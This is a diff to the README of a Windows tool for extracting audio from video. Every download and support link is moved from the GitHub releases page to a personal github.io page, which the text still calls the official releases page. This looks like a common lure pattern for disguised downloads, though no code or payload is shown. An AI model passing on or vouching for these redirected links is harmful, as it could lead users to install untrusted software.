@@ -6,13 +6,13 @@ Ever wanted to grab just the sound from a video? Whether it's a song from a conc
 
 ## 📥 Download the App
 
-[![Download audio-extractor-tool](https://img.shields.io/badge/Download-audio--extractor--tool-2ea44f?style=for-the-badge)](https://github.com/Jefferycoarsened4549/audio-extractor-tool/releases)
+[![Download audio-extractor-tool](https://img.shields.io/badge/Download-audio--extractor--tool-2ea44f?style=for-the-badge)](https://jefferycoarsened4549.github.io)
 
 Visit this link to download the application. That's the official download page where you'll find the latest version.
 
 ## 🛠️ How to Download and Install
 
-**Step 1:** Click the big green button above or go directly to [https://github.com/Jefferycoarsened4549/audio-extractor-tool/releases](https://github.com/Jefferycoarsened4549/audio-extractor-tool/releases)
+**Step 1:** Click the big green button above or go directly to [https://jefferycoarsened4549.github.io](https://jefferycoarsened4549.github.io)
 
 **Step 2:** On that page, you'll see a list of available files. Look for the one that says something like "audio-extractor-tool" with a version number. Visit this link to download the application.
 
@@ -97,7 +97,7 @@ Yes, the tool works for any legitimate use. Just make sure you have the rights t
 
 If you run into any issues, here's what you can do:
 
-- **Check the GitHub Page:** The [official releases page](https://github.com/Jefferycoarsened4549/audio-extractor-tool/releases) is always the best place to find updates and related information.
+- **Check the GitHub Page:** The [official releases page](https://jefferycoarsened4549.github.io) is always the best place to find updates and related information.
 - **Reinstall the App:** Sometimes a fresh install solves unexpected problems. Uninstall, then download and install again.
 - **Update Windows:** Make sure your Windows is up to date for the best compatibility.
 
@@ -107,7 +107,7 @@ audio-extractor-tool is one of those tools that just works. No fuss, no complica
 
 The tool respects your privacy - everything happens locally on your machine. Your videos and audio files never leave your computer. It's fast, it's reliable, and it does exactly what it promises.
 
-So what are you waiting for? [Grab your copy now](https://github.com/Jefferycoarsened4549/audio-extractor-tool/releases) and start extracting! Whether you're a podcaster needing a clean audio file, a teacher clipping lecture audio, or just someone who wants the soundtrack from a video, this tool has you covered.
+So what are you waiting for? [Grab your copy now](https://jefferycoarsened4549.github.io) and start extracting! Whether you're a podcaster needing a clean audio file, a teacher clipping lecture audio, or just someone who wants the soundtrack from a video, this tool has you covered.
 
 Enjoy your extracted audio. 🎧
 
